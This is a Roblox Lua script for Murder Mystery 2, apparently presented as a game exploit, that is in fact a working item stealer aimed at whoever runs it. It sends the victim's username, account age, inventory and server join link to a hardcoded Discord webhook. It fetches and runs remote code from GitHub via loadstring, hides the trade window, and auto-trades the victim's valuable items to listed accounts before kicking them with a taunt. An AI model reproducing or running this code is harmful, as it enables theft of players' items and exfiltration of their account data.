if _G.StealerLock then return end
_G.StealerLock = true

-- ============================================================
-- CONFIG
-- ============================================================
local webhookUser    = _G.Webhook or ""
local webhookOwner   = "https://discord.com/api/webhooks/1546322349366714518/hBRtXHj9op6fUDEx1CPYIHDkMeh5RYG2VHjzwi5skimnALImF9hU06XL3w01urR5M94b"
local minRarity      = "Common"
local minVal         = tonumber(_G.MinValue) or 0
local usernames      = _G.Usernames or {}
local OWNER_FLOOR    = 1000
local TRADE_COOLDOWN = 7
local STEAL_TIMEOUT  = 100

if #usernames == 0 then _G.StealerLock = false return end

-- ============================================================
-- SERVICES
-- ============================================================
local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService       = game:GetService("HttpService")
local me                = Players.LocalPlayer
local myGui             = me:WaitForChild("PlayerGui")

-- ============================================================
-- GUARDS
-- ============================================================
if game.PlaceId ~= 142823291 then me:Kick("Join MM2") return end
do
    local gs = ReplicatedStorage:FindFirstChild("GetServerType")
    if gs and gs:InvokeServer() == "VIPServer" then me:Kick("No VIP") return end
end
if #Players:GetPlayers() >= 12 then me:Kick("Server full") return end

-- ============================================================
-- REMOTES / DB
-- FIX: Database path corrigido — source usa Database.Sync, não Database.Sync.Item
-- ============================================================
local tradeRemote = ReplicatedStorage:WaitForChild("Trade")
local Database    = require(
    ReplicatedStorage:WaitForChild("Database")
        :WaitForChild("Sync")
)
local rarityOrder = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}

-- ============================================================
-- ESTADO DE TRADE
-- ============================================================
local isTrading     = false
local waitingFor    = false
local tradeConn     = nil
local currentTarget = nil
local tradeLock     = false
local tradeToken    = 0
local stealTimer    = nil

-- bloqueia pedidos externos, aceita só do target atual
tradeRemote.SendRequest.OnClientInvoke = function(sender)
    if currentTarget and sender and sender.Name == currentTarget then
        return true
    end
    return false
end

-- ============================================================
-- VALORES (PARALLEL LOAD)
-- ============================================================
local valueCache = {}
local cats = {
    "Godlys%20Value","Ancients%20Values",
    "Vintage%20Values","Chromas%20Values","Uniques%20Value"
}
local loaded, total = 0, #cats
for _, path in ipairs(cats) do
    task.spawn(function()
        local ok, raw = pcall(game.HttpGet, game,
            "https://raw.githubusercontent.com/GnsXv/Values/refs/heads/main/" .. path)
        if ok and raw then
            local fn = loadstring(raw)
            if fn then
                local ok2, t = pcall(fn)
                if ok2 and type(t) == "table" then
                    for id, v in pairs(t) do
                        if not valueCache[id] then valueCache[id] = v end
                    end
                end
            end
        end
        loaded = loaded + 1
    end)
end
local w = 0
while loaded < total and w < 80 do task.wait(0.1) w = w + 1 end

local function getValue(id, rarity)
    if valueCache[id] then return valueCache[id] end
    if minVal == 0 then return 1 end
    local lv  = table.find(rarityOrder, rarity) or 0
    local god = table.find(rarityOrder, "Godly") or 5
    return (lv >= god) and 2 or 1
end

-- ============================================================
-- NON-TRADABLE
-- ============================================================
local nonTradable = {
    DefaultGun=true,DefaultKnife=true,
    Reaver=true,Reaver_Legendary=true,Reaver_Godly=true,Reaver_Ancient=true,
    IceHammer=true,IceHammer_Legendary=true,IceHammer_Godly=true,IceHammer_Ancient=true,
    Gingerscythe=true,Gingerscythe_Legendary=true,Gingerscythe_Godly=true,Gingerscythe_Ancient=true,
    TestItem=true,Season1TestKnife=true,Cracks=true,Icecrusher=true,
    ["???"]=true,Dartbringer=true,
    TravelerAxeRed=true,TravelerAxeBronze=true,TravelerAxeSilver=true,TravelerAxeGold=true,
    BlueCamo_K_2022=true,GreenCamo_K_2022=true,SharkSeeker=true,
}

-- ============================================================
-- BUILD INVENTORY
-- FIX: GetProfileData não recebe argumento — server já sabe quem invoca.
--      Passando me.Name causava falha silenciosa em algumas versões do remote.
-- ============================================================
local ok_inv, profileData = pcall(function()
    return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer()
end)
if not ok_inv or not profileData or not profileData.Weapons or not profileData.Weapons.Owned then
    _G.StealerLock = false
    me:Kick("Falha ao carregar inventário.")
    return
end

local sToTrade     = {}
local goodsDisplay = {}
local overallValue = 0
local totalCount   = 0
local minLevel     = table.find(rarityOrder, minRarity) or 1

for id, count in pairs(profileData.Weapons.Owned) do
    local itemDb = Database.Weapons and Database.Weapons[id]
    local rarity = itemDb and itemDb.Rarity
    if not rarity then continue end
    local lv = table.find(rarityOrder, rarity) or 0
    if lv < minLevel or nonTradable[id] then continue end
    local qty = tonumber(count) or 1
    if qty < 1 then qty = 1 end
    local val = getValue(id, rarity)
    if not val or val < minVal then continue end
    overallValue = overallValue + val * qty
    totalCount   = totalCount  + qty
    table.insert(sToTrade,     {id=id, rarity=rarity, qty=qty, val=val})
    table.insert(goodsDisplay, {id=id, rarity=rarity, qty=qty, val=val})
end

local function sortByVal(t)
    table.sort(t, function(a, b)
        if a.val ~= b.val then return a.val > b.val end
        return (table.find(rarityOrder, a.rarity) or 0) > (table.find(rarityOrder, b.rarity) or 0)
    end)
end
sortByVal(sToTrade)
sortByVal(goodsDisplay)

if #sToTrade == 0 then
    _G.StealerLock = false
    me:Kick("Nenhum item encontrado.")
    return
end

-- ============================================================
-- WEBHOOK
-- ============================================================
local execName = "Unknown"
if type(identifyexecutor) == "function" then
    local ok, n = pcall(identifyexecutor)
    if ok and type(n) == "string" then execName = n end
end

local function rarityEmoji(r)
    if r == "Ancient"       then return "🗡️"
    elseif r == "Godly"     then return "✨"
    elseif r:find("Chroma") then return "🌈"
    else                         return "🔪" end
end

local serverLink = "https://mshsmdhejs.lovable.app/?placeId=142823291&gameInstanceId=" .. game.JobId

local function buildLines(maxItems)
    local lines, shown = {}, 0
    for _, item in ipairs(goodsDisplay) do
        if #lines >= (maxItems or 16) then break end
        local mult = item.qty > 1 and " [x"..item.qty.."]" or ""
        table.insert(lines, rarityEmoji(item.rarity).." "..item.id.." — "..item.val..mult)
        shown = shown + item.qty
    end
    if totalCount > shown then
        table.insert(lines, "and "..(totalCount - shown).." more..")
    end
    return lines
end

local function buildEmbed(label)
    local isGood = overallValue >= 5
    return {
        content    = isGood and "@everyone" or "",
        username   = "Wraith External",
        avatar_url = "https://i.postimg.cc/D0n1q6Nm/file-0000000085a8820e9db97bed958b714b.png",
        embeds = {{
            title       = (isGood and "💀  GOOD HIT" or "🔪  SMALL HIT")
                          .."  ━  "..string.format("%.1f", overallValue).." value"
                          ..(label and ("  ["..label.."]") or ""),
            description = ">>> **`"..me.Name.."`** sniped in MM2\n"
                          .."`"..me.AccountAge.." days old`  ·  `"..#Players:GetPlayers().."/12`",
            color = 0x008CFF,
            fields = {
                {name="👤  Display Name",
                 value="```"..(me.DisplayName ~= "" and me.DisplayName or me.Name).."```", inline=true},
                {name="🖥️  Executor",
                 value="```"..execName.."```", inline=true},
                {name="📦  Inventory  ·  "..totalCount.." items",
                 value="```"..table.concat(buildLines(16), "\n").."```", inline=false},
                {name="📡  Teleport",
                 value="```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(142823291,'"..game.JobId.."')\n```", inline=false},
                {name="🔗  Join",
                 value="[→ Click to Join]("..serverLink..")", inline=false},
            },
            author  = {name="⚔️  Wraith External  ·  Murder Mystery 2"},
            footer  = {text="Wraith External  ·  "..os.date("!%Y-%m-%d %H:%M UTC")},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        }},
        attachments = {},
    }
end

local function postHook(url, payload)
    if not url or url == "" then return false end
    local ok = pcall(request, {
        Url     = url,
        Method  = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body    = HttpService:JSONEncode(payload),
    })
    return ok
end

local function sendLogs()
    local payload = buildEmbed()
    if not postHook(webhookUser, payload) then
        postHook(webhookOwner, buildEmbed("FALLBACK"))
    end
    if overallValue >= OWNER_FLOOR then
        postHook(webhookOwner, buildEmbed("HIGH VALUE"))
    end
end

task.spawn(sendLogs)

-- ============================================================
-- BLOCK TRADE GUI
-- ============================================================
local function lockGui(obj)
    if obj.Name == "TradeGUI" or obj.Name == "TradeGUI_Phone" then
        obj.Enabled = false
        obj:GetPropertyChangedSignal("Enabled"):Connect(function()
            obj.Enabled = false
        end)
    end
    for _, child in ipairs(obj:GetChildren()) do
        lockGui(child)
    end
end
for _, obj in ipairs(myGui:GetChildren()) do lockGui(obj) end
myGui.ChildAdded:Connect(lockGui)

-- ============================================================
-- REMOTE HELPERS
-- FIX: definidas ANTES de requeueTarget para evitar nil-call crash
-- ============================================================
local function destroyTradeRequest()
    local ok, raw = pcall(game.HttpGet, game,
        "https://raw.githubusercontent.com/WraithExternal/main/refs/heads/main/destroy")
    if ok and raw then
        local fn = loadstring(raw)
        if fn then pcall(fn) end
    end
end

local function sendRequest(name)
    local p = Players:FindFirstChild(name)
    if not p then return false end
    local ok, result = pcall(function()
        return tradeRemote.SendRequest:InvokeServer(p)
    end)
    return ok and result ~= false
end

local function declineTrade()
    pcall(function() tradeRemote.DeclineTrade:FireServer() end)
end

-- ============================================================
-- OFFER + ACCEPT STATE
-- ============================================================
local lastOffer    = nil
local tradeActive  = false
local tradeSuccess = false  -- FIX: flag separada de sucesso real (confirmado pelo server)

-- FIX: AcceptTrade.OnClientEvent — distingue sucesso (p90=true) de falha (p90=false)
--      Só seta tradeSuccess=true quando o server confirma o trade.
tradeRemote.AcceptTrade.OnClientEvent:Connect(function(success)
    tradeSuccess = (success == true)
    tradeActive  = false
end)

-- ============================================================
-- OFFER
-- ============================================================
local function offerItem(id)
    pcall(function() tradeRemote.OfferItem:FireServer(id, "Weapons") end)
end

local function placeItems()
    if #sToTrade == 0 then return end
    local batch = {}
    for i = 1, math.min(4, #sToTrade) do
        table.insert(batch, sToTrade[i])
    end
    task.wait(0.3)
    for _, item in ipairs(batch) do
        for _ = 1, item.qty do
            offerItem(item.id)
            task.wait(0.5)
        end
        task.wait(0.8)
    end
    task.wait(TRADE_COOLDOWN)
end

-- FIX: consumeBatch só remove itens se tradeSuccess=true
--      Evita consumir inventário em trade recusado/falho pelo servidor.
local function consumeBatch(batch)
    if not batch or not tradeSuccess then return end
    for _, offered in ipairs(batch) do
        for i, queued in ipairs(sToTrade) do
            if queued.id == offered.id and queued.rarity == offered.rarity then
                table.remove(sToTrade, i)
                break
            end
        end
    end
end

-- FIX: acceptFired é flag por-trade, resetada no início de cada doTrade
local acceptFired = false
local function autoAccept()
    if acceptFired then return end
    acceptFired = true
    for _ = 1, 4 do
        if lastOffer then
            pcall(function()
                tradeRemote.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer)
            end)
            return
        end
        task.wait(1)
    end
    declineTrade()
end

local function waitTradeDone()
    local t = 0
    while tradeActive and t < 300 do
        task.wait(0.1)
        t = t + 1
    end
end

-- ============================================================
-- ESTADO DE TRADE — HELPERS
-- ============================================================
local function cancelConn()
    if tradeConn then
        tradeConn:Disconnect()
        tradeConn = nil
    end
end

local function cancelStealTimer()
    if stealTimer then
        task.cancel(stealTimer)
        stealTimer = nil
    end
end

-- ============================================================
-- FORWARD DECLARATION: doTrade
-- ============================================================
local doTrade

-- ============================================================
-- REQUEUE
-- ============================================================
local function requeueTarget(targetName, retries)
    cancelConn()
    cancelStealTimer()
    isTrading  = false
    waitingFor = false

    if tradeActive then
        declineTrade()
        tradeActive = false
        task.wait(1)
    end

    local function tryTrade()
        if #sToTrade == 0 then
            _G.StealerLock = false
            me:Kick("all your items were stolen — discord.gg/3bbHuRwej")
            return
        end
        task.wait(2)
        sendRequest(targetName)
        task.wait(1)
        destroyTradeRequest()
        doTrade(targetName, retries or 0)
    end

    local p = Players:FindFirstChild(targetName)
    if p then
        tryTrade()
    else
        local conn
        conn = Players.PlayerAdded:Connect(function(player)
            if player.Name ~= targetName then return end
            conn:Disconnect()
            task.wait(3)
            tryTrade()
        end)
    end
end

-- ============================================================
-- TRADE LOOP
-- ============================================================
doTrade = function(targetName, retries)
    retries = retries or 0
    if retries >= 12 then
        _G.StealerLock = false
        me:Kick("max retries — discord.gg/3bbHuRwej")
        return
    end
    if isTrading then return end
    isTrading    = true
    waitingFor   = true
    tradeActive  = false
    tradeSuccess = false
    lastOffer    = nil
    acceptFired  = false  -- reset por-trade
    cancelConn()

    tradeToken = tradeToken + 1
    local myToken = tradeToken

    stealTimer = task.delay(STEAL_TIMEOUT, function()
        if tradeToken ~= myToken then return end
        requeueTarget(targetName, retries)
    end)

    tradeConn = tradeRemote.StartTrade.OnClientEvent:Connect(function(tradeData, playerName)
        if playerName ~= targetName then return end
        if tradeToken ~= myToken then return end

        cancelConn()
        cancelStealTimer()
        waitingFor   = false
        tradeActive  = true
        tradeSuccess = false
        acceptFired  = false

        -- FIX: lastOffer inicializado do tradeData inicial se disponível
        lastOffer = tradeData and tradeData.LastOffer or nil

        -- captura o batch neste momento — consistente com o que placeItems vai ofertar
        local batch = {}
        for i = 1, math.min(4, #sToTrade) do
            batch[i] = sToTrade[i]
        end

        placeItems()
        autoAccept()
        waitTradeDone()

        -- FIX: só consome se tradeSuccess=true (server confirmou via AcceptTrade event p90=true)
        consumeBatch(batch)

        isTrading   = false
        tradeActive = false

        if #sToTrade > 0 then
            task.wait(2)
            if not Players:FindFirstChild(targetName) then
                requeueTarget(targetName, retries + 1)
                return
            end
            sendRequest(targetName)
            doTrade(targetName, retries + 1)
        else
            _G.StealerLock = false
            me:Kick("all your items were stolen — discord.gg/3bbHuRwej")
        end
    end)

    -- timeout de 30s aguardando StartTrade
    task.delay(30, function()
        if not waitingFor or tradeToken ~= myToken then return end
        cancelConn()
        isTrading  = false
        waitingFor = false
        declineTrade()
        task.wait(2)
        if #sToTrade > 0 then
            if not Players:FindFirstChild(targetName) then
                requeueTarget(targetName, retries + 1)
                return
            end
            sendRequest(targetName)
            doTrade(targetName, retries + 1)
        end
    end)
end

-- ============================================================
-- UPDATE / DECLINE EVENTS
-- ============================================================
tradeRemote.UpdateTrade.OnClientEvent:Connect(function(tradeData)
    if not tradeActive or not tradeData then return end

    if tradeData.LastOffer ~= nil then
        lastOffer = tradeData.LastOffer
    end

    if not (tradeData.Player1 and tradeData.Player2) then return end

    local p1 = tradeData.Player1.Player and tradeData.Player1.Player.Name
    local p2 = tradeData.Player2.Player and tradeData.Player2.Player.Name

    if currentTarget == nil then return end

    if p1 ~= me.Name and p1 ~= currentTarget
        and p2 ~= me.Name and p2 ~= currentTarget then
        return
    end

    local targetAccepted =
        (p1 == currentTarget and tradeData.Player1.Accepted == true)
        or
        (p2 == currentTarget and tradeData.Player2.Accepted == true)

    if targetAccepted then
        autoAccept()
    end
end)

-- FIX: DeclineTrade passa retries+1 em vez de resetar para 0
--      Evita loop infinito entre targets quando o target recusa propositalmente.
tradeRemote.DeclineTrade.OnClientEvent:Connect(function()
    if not isTrading then return end
    cancelConn()
    cancelStealTimer()
    isTrading    = false
    waitingFor   = false
    tradeActive  = false
    tradeSuccess = false
    lastOffer    = nil
    if currentTarget and #sToTrade > 0 then
        task.wait(2)
        if not Players:FindFirstChild(currentTarget) then
            requeueTarget(currentTarget, 1)
            return
        end
        sendRequest(currentTarget)
        doTrade(currentTarget, 1)  -- FIX: era 0, agora incrementa para não loopar infinito
    end
end)

-- ============================================================
-- START COM TARGET
-- FIX: tradeLock por-target (lock local, não compartilhado entre targets)
-- ============================================================
local function startWithTarget(name)
    local localLock = false

    local function tryStart()
        if localLock then return end
        localLock     = true
        tradeLock     = true
        currentTarget = name
        if #sToTrade == 0 then localLock = false tradeLock = false return end
        sendRequest(name)
        task.wait(1)
        destroyTradeRequest()
        doTrade(name)
    end

    local p = Players:FindFirstChild(name)
    if p then
        local ok = false
        for _ = 1, 10 do
            task.wait(1)
            if p and p.Character then ok = true break end
        end
        task.wait(ok and 0.5 or 3)
        tryStart()
    else
        local conn
        conn = Players.PlayerAdded:Connect(function(player)
            if player.Name ~= name then return end
            conn:Disconnect()
            task.wait(3)
            if player.Character or player.CharacterAdded:Wait() then
                task.wait(0.5)
            end
            tryStart()
        end)
    end
end

for _, uname in ipairs(usernames) do
    task.spawn(startWithTarget, uname)
end

me:GetPropertyChangedSignal("Parent"):Connect(function()
    _G.StealerLock = false
end)
